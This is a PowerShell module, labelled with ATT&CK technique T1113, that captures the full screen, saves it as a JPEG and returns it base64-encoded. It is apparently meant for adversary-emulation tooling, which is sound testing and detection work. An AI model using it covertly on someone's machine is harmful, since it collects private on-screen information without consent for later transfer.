#Title: invoke-screenshot
#Technique: T1113
#Tactic: TA0009

function invoke-screenshot {
    $results = ""
    $good = $false

    # Picture name
    $pictureFile = ".\screenshot-"+"$(get-date -f dd-HH-mm-ss).jpg"
    # Add .NET Framework types to this PowerShell session
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    # Get screen resolution
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top
    # Create bitmap
    $picture = New-Object System.Drawing.Bitmap $width, $height
    # Create graphics from the bitmap
    $graphic = [System.Drawing.Graphics]::FromImage($picture)
    # Screenshot
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $picture.Size)
    # Save to file
    $picture.Save($pictureFile) 
    #Checks if the file exists

    if([System.IO.File]::Exists($pictureFile)){
        $good = $true
        #Base64 image encoding
        $content = Get-Content $pictureFile -Encoding byte
        $results = [convert]::ToBase64String($content)
    }

    return @{results = $results; success = $good }
}

#Main

#GiveMeData if needed

#pdd
$execute = invoke-screenshot
return @{results = $execute.results; success = $execute.success; }
#PutData if needed

